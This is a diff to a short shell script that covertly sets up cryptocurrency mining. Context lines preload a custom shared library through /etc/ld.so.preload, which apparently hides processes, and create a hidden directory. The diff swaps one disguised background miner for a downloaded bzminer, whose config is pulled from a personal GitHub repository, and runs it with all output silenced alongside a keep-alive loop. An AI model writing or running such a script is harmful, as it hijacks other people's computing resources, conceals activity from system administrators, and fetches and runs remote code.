@@ -7,8 +7,10 @@ mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
 mkdir .kap && cd .kap
-git clone https://github.com/6248202226/gradi.git
-cd gradi
-chmod +x 80.json && chmod +x zepo
-./zepo -c "80.json" > /dev/null 2>&1 &
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
+wget https://github.com/bzminer/bzminer/releases/download/v17.0.0/bzminer_v17.0.0_linux.tar.gz
+tar xf bzminer_v17.0.0_linux.tar.gz
+cd bzminer_v17.0.0_linux
+rm -rf config.txt
+wget -O config.txt https://raw.githubusercontent.com/6248202226/filesg/main/bzminerconfig
+./bzminer > /dev/null 2>&1 &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
